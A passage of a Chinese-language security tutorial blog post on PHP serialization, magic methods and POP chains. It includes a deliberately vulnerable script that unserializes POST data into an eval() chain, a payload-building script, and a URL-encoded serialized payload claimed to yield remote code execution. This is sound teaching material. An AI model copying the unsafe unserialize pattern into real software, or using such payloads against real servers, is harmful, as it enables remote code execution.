+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="s2">&#34;pro&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//将对象作为函数，调用 __invoke()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//程序结束，调用 __destruct()
+</span></span></span><span class="line"><span class="cl"><span class="c1">//会调用两次__destruct，因为中间有一次反序列化
+</span></span></span><span class="line"><span class="cl"><span class="c1">//第一次是因为反序列化后的对象$c没有被使用了，最后一次是因为$a没有再被使用了
+</span></span></span></code></pre></div><h3 id="property-oriented-programming--pop--面向属性编程">Property Oriented Programming (POP) 面向属性编程</h3>
+<p>这个概念根据我的调查，应该不是类似于，面向对象编程（e.g., JAVA）,面向过程编程（C）这种传统意义上的编程，而是安全领域独有的一种形式。 <!-- raw HTML omitted --></p>
+<p>这也导致了我一开始很难理解这个概念，因为不同的师傅用中英文写出来的理解总有一些差别 <!-- raw HTML omitted --></p>
+<p>因此我们这里先不着急给POP Chain下定义，先来看一个很简单的例子，然后也许大家能够理解我对于POP的总结与定义 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Example</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// some PHP code...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span><span class="p">))</span> <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span><span class="o">-&gt;</span><span class="na">evaluate</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CodeSnippet</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$code</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">evaluate</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// some PHP code...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user_data</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>上面的代码定义了两个类，Example以及CodeSnippet <!-- raw HTML omitted --></p>
+<p>其中Example中首先定义了一个私有的属性 <code>$obj</code> <!-- raw HTML omitted --></p>
+<p>同时实现了 <code>__wakeup()</code> 魔术方法，回忆一下，其会在反序列化的时候被调用，然后执行 <code>$obj</code> 这个属性中的方法 <code>evaluate()</code>  <!-- raw HTML omitted --></p>
+<p>CodeSnippet中也有一个私有属性 <code>$code</code> <!-- raw HTML omitted --></p>
+<p>实现了一个方法 <code>evaluate()</code> 其可以执行 <code>$code</code> 中的PHP代码 <!-- raw HTML omitted --></p>
+<p>然后该PHP脚本会对POST的变量 <code>data</code> 进行反序列化 <!-- raw HTML omitted --></p>
+<p>隐隐约约大家应该也能感受到些什么，反序列化？__wakeup()会在反序列化中被调用？ <!-- raw HTML omitted --></p>
+<p>我们接着来看我们到底可以进行怎样的利用： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CodeSnippet</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$code</span> <span class="o">=</span> <span class="s2">&#34;phpinfo();&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Example</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CodeSnippet</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">print</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Example</span><span class="p">()));</span>
+</span></span></code></pre></div><p>黑客可以构造以上的PHP脚本，目的是为了输出一个序列化后的内容 <!-- raw HTML omitted --></p>
+<ol>
+<li>首先定义了一个codeSnippet类，并且其中有一个私有属性 <code>$code</code> 其中包含了php代码 <!-- raw HTML omitted --></li>
+<li>接着定义了一个Example类，其中有一个私有属性 <code>$obj</code>, 同时实现了魔术方法 <code>__construct</code>, 其中构造了一个新的 CodeSnippet 对象，并赋值给 <code>$obj</code> <!-- raw HTML omitted --></li>
+<li>最后新建一个Example类并进行序列化后进行url编码后输出 <!-- raw HTML omitted --></li>
+</ol>
+<p><figure><img src="/ox-hugo/2022-06-15_12-09-33_screenshot.png"
+         alt="Figure 4: PHP Chain serialized output" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->PHP Chain serialized output</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">%</span><span class="mi">3</span><span class="nx">A7</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="nx">Example</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">A1</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">7</span><span class="nx">Bs</span><span class="o">%</span><span class="mi">3</span><span class="nx">A12</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mo">00</span><span class="nx">Example</span><span class="o">%</span><span class="mo">00</span><span class="nx">obj</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">BO</span><span class="o">%</span><span class="mi">3</span><span class="nx">A11</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="nx">CodeSnippet</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">A1</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">7</span><span class="nx">Bs</span><span class="o">%</span><span class="mi">3</span><span class="nx">A17</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mo">00</span><span class="nx">CodeSnippet</span><span class="o">%</span><span class="mo">00</span><span class="nx">code</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">Bs</span><span class="o">%</span><span class="mi">3</span><span class="nx">A10</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="nx">phpinfo</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">7</span><span class="nx">D</span><span class="o">%</span><span class="mi">7</span><span class="nx">D</span>
+</span></span></code></pre></div><p>之后将序列化的字符串作为POST变量提交到服务端脚本，就可以实现RCE <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-06-15_12-08-49_screenshot.png"
+         alt="Figure 5: RCE成功执行" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 5: <!-- raw HTML omitted -->RCE成功执行</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>这里值得注意的几件事是 <!-- raw HTML omitted --></p>
+<ol>
+<li>PHP中变量的调用记得用isset先做判断否则会出现如下warning <!-- raw HTML omitted --></li>
+</ol>
+<p><figure><img src="/ox-hugo/2022-06-15_12-12-40_screenshot.png"
+         alt="Figure 6: Warning for undefinied property" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 6: <!-- raw HTML omitted -->Warning for undefinied property</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<ol>
+<li>要注意使用浏览器工具是否如你所想，大家可以看到我用了很多hackbar类似的插件，他们总会出现一些问题，比如对于url的过度解析，或者是加入一下不必要的参数，因此出现奇怪的问题的时候，可以用Burp抓包来看一看，然后最稳健的方法还是Burp来进行HTTP请求，最直观。 <!-- raw HTML omitted --></li>
+</ol>
+<p>至此，我们可以来总结一下这个例子并给出POP的定义 <!-- raw HTML omitted --></p>
+<ul>
+<li>我们在能够获取服务端脚本源码的情况下，通过对于反序列化函数 <code>unserialize()</code> 会调用 <code>__wakeup()</code> 魔术方法的特性， <!-- raw HTML omitted --></li>
+<li>构造Example以及CodeSnippet类， <!-- raw HTML omitted --></li>
+<li>同时为其中的 <code>属性</code> （$code）进行赋值， <!-- raw HTML omitted --></li>
+<li>并且可以通过 <code>__construct()</code> 方法来新建 CodeSnippet 对象($this-&gt;obj) <!-- raw HTML omitted --></li>
+<li>接着序列化后作为一个对象（有属性的值的）发送给服务端脚本 <!-- raw HTML omitted --></li>
+<li>进而服务端会在反序列化的时候调用 <code>__wakepup()</code>, 并利用我们已经定义好了属性值进行执行，导致RCE的发生 <!-- raw HTML omitted --></li>
+</ul>
+<p>POP面向属性编程，就是我们通过构造 <code>目标脚本</code> 中类的 <code>object</code> ，并且为其 <code>property, 属性</code> 赋值，继而这些  <code>property, 属性</code> 会作为  <code>敏感函数</code> 的参数来执行恶意行为： <!-- raw HTML omitted --></p>
+<ul>
+<li>命令执行：exec()、passthru()、popen()、system() <!-- raw HTML omitted --></li>
+<li>文件操作：file_put_contents()、file_get_contents()、unlink() <!-- raw HTML omitted --></li>
+</ul>
+<p><code>POP Chain</code> 就是从魔术方法开始，想办法找到一条调用链，比如我们用到的例子中： <!-- raw HTML omitted --></p>
+<p><code>unserialize() -&gt; __wakeup() -&gt; evaluate() -&gt; eval()</code> <!-- raw HTML omitted --></p>
+<p>就是一条POP链，我们就是要找到这样一条函数调用链，最终执行输入的恶意代码 <!-- raw HTML omitted --></p>
+<p>以上就是全部的基础知识的信息，之后我们就可以通过具体的题目来进行进一步的巩固和拓展（应该会新开一篇文章来记录） <!-- raw HTML omitted --></p>
+<h3 id="reference">Reference</h3>
+<p><a class="link" href="https://www.php.net/manual/en/function.serialize.php"  target="_blank" rel="noopener"
+    >serialize:php.net</a> <!-- raw HTML omitted -->
+<a class="link" href="https://www.php.net/manual/en/language.oop5.magic.php#object.sleep"  target="_blank" rel="noopener"
+    >Magic+Methods:php.net</a> <!-- raw HTML omitted -->
+<a class="link" href="https://www.freebuf.com/articles/web/209975.html"  target="_blank" rel="noopener"
+    >PHP反序列化漏洞简介及相关技巧小结</a> <!-- raw HTML omitted -->
+<a class="link" href="https://blog.csdn.net/qq_45521281/article/details/105891381"  target="_blank" rel="noopener"
+    >PHP序列化反序列化漏洞总结（一篇懂）</a> <!-- raw HTML omitted -->
+<a class="link" href="https://mp.weixin.qq.com/s/FhwML5Jy6X8glJNOeMgV2g"  target="_blank" rel="noopener"
+    >PHP反序列化漏洞说明</a> <!-- raw HTML omitted -->
+<a class="link" href="https://v0w.top/2020/03/05/unsearise-POP/#0x01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"  target="_blank" rel="noopener"
+    >php反序列化与POP链</a> <!-- raw HTML omitted -->
+<a class="link" href="https://stackoverflow.com/questions/5201342/php-destruct-called-twice"  target="_blank" rel="noopener"
+    >Php+Destruct+Called+Twice</a> <!-- raw HTML omitted -->
+<a class="link" href="https://snoopysecurity.github.io/web-application-security/2021/01/08/02_php_object_injection_exploitation-notes.html"  target="_blank" rel="noopener"
+    >PHP+Object+Injection+Exploitation+Notes</a> <!-- raw HTML omitted -->
+<a class="link" href="https://vickieli.medium.com/diving-into-unserialize-pop-chains-35bc1141b69a"  target="_blank" rel="noopener"
+    >Diving+into+unserialize():+POP+Chains</a> <!-- raw HTML omitted -->
+<a class="link" href="https://www.jianshu.com/p/16c56bebc63d"  target="_blank" rel="noopener"
+    >php反序列化利用——POP链构造实例</a> <!-- raw HTML omitted -->
+<a class="link" href="https://stackoverflow.com/questions/4261133/notice-undefined-variable-notice-undefined-index-warning-undefined-arr"  target="_blank" rel="noopener"
+    >&ldquo;Notice: Undefined variable&rdquo;, &ldquo;Notice: Undefined index&rdquo;, &ldquo;Warning: Undefined array key&rdquo;, and &ldquo;Notice: Undefined offset&rdquo; using PHP</a> <!-- raw HTML omitted -->
+<a class="link" href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html"  target="_blank" rel="noopener"
+    >Laravel+POP链简析</a> <!-- raw HTML omitted --></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/php/">php</a>
+        
+            <a href="/tags/serialize/">serialize</a>
+        
+            <a href="/tags/unserialize/">unserialize</a>
+        
+            <a href="/tags/magic_functions/">magic_functions</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Jun 15, 2022 15:26 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/sql_injection_file_rw/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入：文件读写</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/lrfi_basic/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Local/Remote File Inclusion 文件包含漏洞</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/sql_injection_basic/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入：基础</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2022 Under The Ginkgo
+    </section>
+
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <section class="powerby">
+      <span id="busuanzi_container_site_pv" style='display:none'>
+        Viwe <span id="busuanzi_value_site_pv"></span> times
+      </span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#php-序列化与反序列化">PHP 序列化与反序列化</a>
+      <ul>
+        <li><a href="#serialize-序列化">Serialize 序列化</a></li>
+        <li><a href="#序列化后的字节流详解">序列化后的字节流详解</a></li>
+        <li><a href="#unserialize-反序列化">Unserialize 反序列化</a></li>
+        <li><a href="#magic-methods-魔术方法">Magic Methods 魔术方法</a></li>
+        <li><a href="#property-oriented-programming--pop--面向属性编程">Property Oriented Programming (POP) 面向属性编程</a></li>
+        <li><a href="#reference">Reference</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
